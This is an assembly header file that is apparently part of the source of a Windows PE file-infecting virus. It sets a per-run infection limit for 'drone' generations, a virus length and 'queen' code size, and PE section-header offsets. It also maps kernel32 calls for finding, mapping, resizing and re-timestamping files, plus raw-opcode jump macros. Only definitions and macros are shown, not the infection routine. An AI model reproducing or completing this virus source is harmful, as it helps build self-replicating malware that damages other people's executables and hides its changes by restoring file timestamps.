%define MAX_INFECTIONS               4 ;Maximum Infections Per Run For A Drone Generation
%define BLOCKDESCRYPTOR_BLOCKSIZE    4
%define BLOCKDESCRYPTOR_IMPORTARRAY 16
%define BLOCKDESCRYPTOR_ENTRYPOINT  20
%define BLOCKDESCRYPTOR_SIZE        20

%define VirtualSize           8 
%define VirtualAddress       12
%define SizeOfRawData        16
%define PointerToRawData     20
%define PointerToRelocations 24
%define PointerToLineNumbers 28
%define NumberOfRelocations  32
%define NumberOfLineNumbers  34
%define Characteristics      36

IMAGE_BASE   EQU 0x400000
max_path     EQU 260

;Total Size Of Virus
%define VIRUS_LENGTH END_OF_VIRUS - START_OF_VIRUS  
;Queen Specific Code (Located At End Of Virus)
%define QUEEN_CODE Payload_BlockTerminator - Payload_BlockDescryptor                                 

%define CreateFileA          [ebp+K32CreateFileA]
%define SetFileAttributesA   [ebp+K32SetFileAttributesA]
%define GetFileAttributesA   [ebp+K32GetFileAttributesA]
%define SetCurrentDirectoryA [ebp+K32SetCurrentDirectoryA]
%define GetCurrentDirectoryA [ebp+K32GetCurrentDirectoryA]
%define FindFirstFileA       [ebp+K32FindFirstFileA]
%define FindNextFileA        [ebp+K32FindNextFileA]
%define GetProcAddress       [ebp+K32GetProcAddress]
%define CloseHandle          [ebp+K32CloseHandle]
%define GetFileTime          [ebp+K32GetFileTime]
%define GetFileSize          [ebp+K32GetFileSize]

%define CreateFileMapping    [ebp+K32CreateFileMapping]
%define MapViewOfFile        [ebp+K32MapViewOfFile]
%define UnmapViewOfFile      [ebp+K32UnmapViewOfFile]
%define SetFileTime          [ebp+K32SetFileTime]
%define SetFilePointer       [ebp+K32SetFilePointer]
%define SetEndOfFile         [ebp+K32SetEndOfFile]

%macro JMPNC 1
    DB  0x72 ;JC
    DB  0x05 ;BY 5 BYTES
    JMP %1
%endmacro

%macro RETBE 0
    DB 0x77    ;JA
    DB 0x01    ;BY 1 BYTE
    RET
%endmacro

%macro CALLBE 1
    DB 0x77    ;JA 
    DB 0x05    ;BY 5 BYTES
    CALL %1
%endmacro

%macro JMPBE 1
    DB 0x77    ;JA
    DB 0x05    ;BY 5 BYTES
    JMP  %1
%endmacro

%macro RETE 0
    DB  0x75   ;JNE
    DB  0x01   ;Jump One Byte
    RET
%endmacro

;Same As Above
%macro RETZ 0
    DB  0x75   ;JNE
    DB  0x01   ;Jump One Byte
    RET
%endmacro

%macro JMPA 1  ;A Long Range JA
    DB  0x76   ;JBE
    DB  0x05   ;Jump Past Next Jump (5 bytes)
    JMP %1     ;JMP To Target
%endmacro

%macro JMPNE 1 ;A Long Range JNE (Same As JNZ)
    DB  0x74   ;JE
    DB  0x05   ;Jump Past Next Jump (5 bytes)
    jmp %1
%endmacro

%macro JMPE 1  ;A Long Range JE (Same As JZ)
    DB  0x75   ;JNE
    DB  0x05   ;Jump Past Next Jump (5 bytes)
    jmp %1
%endmacro

;   ModuleBase FunctionName AddressStorage
%macro GetFunction 3    
       lea   eax,[%2]
       push  eax                     ;Push Function Name
       push  DWORD %1                ;Push Module Base
       call  [K32GetProcAddress+ebp] ;call GetProcAddress
       mov   %3,eax                  ;store function address
       or    eax,eax                 ;
%endmacro

%macro DebugMarker 0
       ;NOP
       ;NOP
       ;NOP
%endmacro

